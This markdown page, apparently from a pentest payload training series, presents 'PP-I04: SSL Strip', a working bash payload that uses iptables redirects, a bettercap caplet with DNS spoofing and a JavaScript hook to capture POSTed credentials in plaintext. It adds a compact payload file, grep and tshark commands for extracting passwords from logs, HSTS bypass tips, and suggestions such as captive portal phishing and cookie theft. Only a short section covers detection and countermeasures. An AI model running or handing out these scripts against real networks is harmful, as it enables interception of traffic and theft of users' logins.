# PP-I04: SSL Strip

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I04 |
| **Name** | SSL Strip |
| **Difficulty** | Intermediate |
| **Type** | Attack |
| **Purpose** | Downgrade HTTPS connections |
| **MITRE ATT&CK** | T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing) |

## What This Payload Does

Performs SSL stripping to downgrade HTTPS connections to HTTP, allowing capture of credentials that would normally be encrypted.

---

## Understanding SSL Strip

```
┌─────────────────────────────────────────────────────────────┐
│                    SSL STRIP ATTACK                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   NORMAL CONNECTION:                                        │
│   Client ──HTTPS──► Server (Encrypted, can't intercept)    │
│                                                              │
│   WITH SSL STRIP:                                           │
│                                                              │
│   Client ──HTTP──► Attacker ──HTTPS──► Server              │
│           ^                                                  │
│           └── Unencrypted! Credentials visible              │
│                                                              │
│   HOW IT WORKS:                                             │
│   1. Client requests http://bank.com                        │
│   2. Attacker intercepts redirect to HTTPS                  │
│   3. Attacker connects to server via HTTPS                  │
│   4. Attacker serves HTTP version to client                 │
│   5. Client sees HTTP site, enters credentials              │
│   6. Attacker captures credentials in plaintext             │
│                                                              │
│   LIMITATIONS:                                               │
│   • HSTS blocks this for preloaded sites                    │
│   • Modern browsers show warnings                           │
│   • Direct https:// URLs bypass it                          │
│   • Certificate pinning defeats it                          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I04
# Name: SSL Strip
# Description: Downgrade HTTPS connections to HTTP
# Author: Security Training
# WARNING: Authorized testing only!
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan0"
GATEWAY_IP="192.168.4.1"
LOOT_DIR="/sd/loot/sslstrip"

# Tool selection (try bettercap first, fallback to sslstrip)
USE_BETTERCAP=true

# ============================================
# SETUP
# ============================================
LOG_FILE="/tmp/pp-i04.log"
CREDS_FILE="$LOOT_DIR/credentials.txt"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Stopping SSL Strip..."
    killall bettercap sslstrip 2>/dev/null
    iptables -t nat -F
    echo 0 > /proc/sys/net/ipv4/ip_forward
    exit 0
}

trap cleanup SIGINT SIGTERM

# ============================================
# MAIN
# ============================================
log "Starting PP-I04: SSL Strip"

mkdir -p "$LOOT_DIR"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ============================================
# BETTERCAP METHOD (Preferred)
# ============================================
if [ "$USE_BETTERCAP" = true ] && command -v bettercap >/dev/null 2>&1; then
    log "Using bettercap for SSL stripping..."

    # Create bettercap caplet
    cat > /tmp/sslstrip.cap << 'EOF'
# SSL Strip Caplet

# Set interface
set net.probe on
set net.sniff on

# SSL Strip settings
set http.proxy.sslstrip true
set https.proxy.sslstrip true

# Credential harvesting
set http.proxy.script /tmp/creds.js

# Enable modules
http.proxy on
https.proxy on
net.sniff on

# DNS spoofing for better coverage
set dns.spoof.all true
dns.spoof on
EOF

    # Create credential capture script
    cat > /tmp/creds.js << 'JSEOF'
function onRequest(req, res) {
    // Log POST requests (likely credentials)
    if (req.Method == "POST") {
        var body = req.ReadBody();
        if (body.length > 0) {
            log("CREDS", req.Hostname + req.Path + " : " + body);
        }
    }
}
JSEOF

    # Set up iptables
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port 8083

    # Run bettercap
    echo ""
    echo "╔════════════════════════════════════════════════════╗"
    echo "║           SSL STRIP ACTIVE (bettercap)             ║"
    echo "╠════════════════════════════════════════════════════╣"
    echo "║  Interface: $INTERFACE"
    echo "║  HTTP Proxy: 8080"
    echo "║  HTTPS Proxy: 8083"
    echo "║  Logs: $LOOT_DIR"
    echo "╚════════════════════════════════════════════════════╝"
    echo ""

    bettercap -iface "$INTERFACE" -caplet /tmp/sslstrip.cap 2>&1 | tee "$LOOT_DIR/bettercap.log"

# ============================================
# SSLSTRIP METHOD (Legacy)
# ============================================
elif command -v sslstrip >/dev/null 2>&1; then
    log "Using sslstrip (legacy method)..."

    # Configure iptables
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 10000

    # Enable ARP spoofing for full MITM (if on same network)
    # arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY &

    echo ""
    echo "╔════════════════════════════════════════════════════╗"
    echo "║           SSL STRIP ACTIVE (sslstrip)              ║"
    echo "╠════════════════════════════════════════════════════╣"
    echo "║  Interface: $INTERFACE"
    echo "║  Listen Port: 10000"
    echo "║  Log: $LOOT_DIR/sslstrip.log"
    echo "╚════════════════════════════════════════════════════╝"
    echo ""

    sslstrip -l 10000 -w "$LOOT_DIR/sslstrip.log" -a

# ============================================
# MANUAL METHOD
# ============================================
else
    log "No SSL strip tool found. Using manual iptables method..."

    # This won't actually strip SSL but will log HTTP traffic
    iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080

    # Use tcpdump to capture HTTP
    tcpdump -i "$INTERFACE" -A -s 0 'tcp port 80' -w "$LOOT_DIR/http_capture.pcap" &

    echo ""
    echo "WARNING: Full SSL stripping not available"
    echo "Capturing HTTP traffic only"
    echo ""

    wait
fi
```

---

## Modern SSL Strip with Bettercap

```bash
#!/bin/bash
# Full bettercap SSL strip setup

# Install bettercap (if needed)
# opkg install bettercap

# Create comprehensive caplet
cat > /tmp/mitm.cap << 'EOF'
# Network discovery
net.probe on

# SSL Strip
set http.proxy.sslstrip true
set http.proxy.sslstrip.usessl true
set http.proxy.sslstrip.hosts ALL

# DNS Spoofing
set dns.spoof.domains *
set dns.spoof.address 192.168.4.1
dns.spoof on

# HTTP Proxy
http.proxy on

# Sniffing
set net.sniff.verbose true
set net.sniff.local true
net.sniff on

# Credential logging
events.stream on
EOF

bettercap -iface wlan0 -caplet /tmp/mitm.cap
```

---

## HSTS Bypass Attempts

HSTS (HTTP Strict Transport Security) blocks SSL strip for preloaded sites. Workarounds:

### Subdomain Bypass
```
bank.com → HSTS protected
wwww.bank.com → Might work (typosquatting)
```

### First-Visit Attack
```
HSTS only works after first visit
New browser/device = no HSTS
```

### HSTS Cache Clearing
```
If you can clear browser data, HSTS resets
```

---

## Credential Extraction

### From bettercap logs
```bash
# Extract credentials
grep -E "username|password|email|login|user|pass" /sd/loot/sslstrip/bettercap.log

# Parse POST data
grep "POST" /sd/loot/sslstrip/bettercap.log | \
    grep -oP '(?<=: ).*' | \
    grep -E "@|pass|user"
```

### From pcap files
```bash
# Extract HTTP POST data
tshark -r capture.pcap -Y "http.request.method==POST" \
    -T fields -e http.file_data

# Search for credentials in pcap
strings capture.pcap | grep -iE "password|passwd|user|login"
```

---

## Red Team Perspective

### Effectiveness Today
| Target | SSL Strip Works? |
|--------|------------------|
| Major banks | No (HSTS preload) |
| Google/Facebook | No (HSTS preload) |
| Smaller sites | Sometimes |
| Internal apps | Often yes |
| Older browsers | Yes |

### Better Alternatives
1. **Captive portal phishing** - More reliable
2. **DNS redirect to fake login** - Bypass HSTS
3. **Credential spraying** - Use captured emails
4. **Session hijacking** - Steal cookies instead

---

## Blue Team Perspective

### Detection

```bash
# Detect ARP spoofing (prerequisite for MITM)
arpwatch -i eth0

# Detect SSL strip indicators
# - Missing HTTPS on expected sites
# - Certificate warnings
# - Mixed content warnings
```

### Countermeasures
1. **HSTS** - Enable on all sites
2. **HSTS Preload** - Submit to browser preload list
3. **Certificate pinning** - Mobile apps
4. **VPN** - Encrypt all traffic
5. **User education** - Check for HTTPS

---

## Payload File

Save as `PP-I04_SSL_Strip.sh`:

```bash
#!/bin/bash
# PP-I04: SSL Strip (Compact)
IFACE="${1:-wlan0}"
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 10000
iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 443 -j REDIRECT --to-port 10000
sslstrip -l 10000 -w /tmp/sslstrip.log -a || \
    bettercap -iface $IFACE -eval "set http.proxy.sslstrip true; http.proxy on"
```

---

[← PP-I03 KARMA Attack](PP-I03_KARMA_Attack.md) | [Back to Intermediate](README.md) | [Next: PP-I05 DNS Spoof →](PP-I05_DNS_Spoof.md)
